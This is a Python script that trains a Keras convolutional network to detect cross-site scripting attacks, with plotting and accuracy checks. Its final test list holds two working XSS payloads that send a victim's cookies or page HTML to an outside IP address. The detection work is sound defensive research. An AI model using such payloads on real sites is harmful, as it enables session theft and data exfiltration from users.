import numpy as np
import pandas as pd
from sklearn.model_selection import train_test_split
import os
import matplotlib.pyplot as plt
import tensorflow as tf
from tensorflow import keras

def convert_to_ascii(input_data): 
    input_data_to_char = []
    for i in input_data:
        input_data_to_char.append(ord(i)) 
    Zero_array = np.zeros((400))
    indexs = min(len(input_data_to_char), 400)
    for i in range(indexs):
        Zero_array[i] = input_data_to_char[i]
    Zero_array.shape = (20, 20)
    return Zero_array

def check_right_wrong(pred_value, testY):
    for i in range(len(pred_value)):
        if pred_value[i] > 0.5:
            pred_value[i] = 1
        else:
            pred_value[i] = 0
    true = 0
    false = 0
    for i in range(len(pred_value)):
        if pred_value[i] == testY[i]:
            true += 1
        else:
            false += 1
    return true, false

def show_plot_history(history): 
    accuracy = history.history['accuracy']
    loss = history.history['loss']
    x = range(1, len(accuracy) + 1)
    val_accuracy = history.history['val_accuracy']
    val_loss = history.history['val_loss']

    plt.figure(figsize=(14, 6))
    plt.subplot(1, 2, 1)
    plt.plot(x, accuracy, 'g', label='Model Training accuracy')
    plt.plot(x, val_accuracy, 'r', label='Model Validation accuracy')
    plt.title('Model Training and Validation Accuracy')
    plt.legend()
    plt.subplot(1, 2, 2)
    plt.plot(x, loss, 'g', label='Model Training loss')
    plt.plot(x, val_loss, 'r', label='Model Validation loss')
    plt.title('Model Training and Validation Loss')
    plt.legend()
    plt.savefig('Model_Training_Validation_Accuracy_Loss.png')
    plt.show()

df = pd.read_csv('XSS-attack-detection-using-deep-learning/XSS_dataset_mixed.csv', encoding='utf-8-sig')

samples_size = 800
df = df[df.columns[-2:]]
sentences = df['Sentence'][:samples_size].values
ascii_sentences = np.zeros((len(sentences), 20, 20))
for i in range(len(sentences)):
    ascii_sentences[i] = convert_to_ascii(sentences[i])

trainX, testX, trainY, testY = train_test_split(ascii_sentences, df['Label'][:samples_size].values, test_size=0.4, random_state=42)

with tf.device("gpu:0"):
    model = tf.keras.models.Sequential([
        tf.keras.layers.Conv2D(128, (3, 3), activation=tf.nn.relu, input_shape=(20, 20, 1)),
        tf.keras.layers.Flatten(),
        tf.keras.layers.Dense(128, activation='relu'),
        tf.keras.layers.Dense(64, activation='relu'),
        tf.keras.layers.Dense(32, activation='relu'),
        tf.keras.layers.Dense(16, activation='relu'),
        tf.keras.layers.Dense(8, activation='relu'),
        tf.keras.layers.Dense(1, activation='sigmoid')
    ])

    model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy'])
    model.summary()
    batch_size = 1
    num_epoch = 5

    # Train the model and store the training history
    model_log = model.fit(trainX, trainY, batch_size=batch_size, verbose=True, epochs=num_epoch, validation_split=0.2)

    # Call the plotting function to display the graphs
    show_plot_history(model_log)

    pred = model.predict(testX)

    right, wrong = check_right_wrong(pred, testY)
    print('Total number of test data:', right + wrong)
    print('Total number of correct predictions:', right)
    print('Total number of incorrect predictions:', wrong)
    print('Accuracy for test data set:', right / (right + wrong) * 100)

    test = ['?name=<script>new Image().src="https://192.165.159.122/fakepg.php?output="+document.cookie;</script>',
            '<script>new Image().src="https://192.165.159.122/fakepg.php?output="+document.body.innerHTML</script>']
    ascii_test = np.zeros((len(test), 20, 20))
    for i in range(len(test)):
        ascii_test[i] = convert_to_ascii(test[i])
    
    print(model.predict(ascii_test))
    model.save('xss_detection_model.h5')

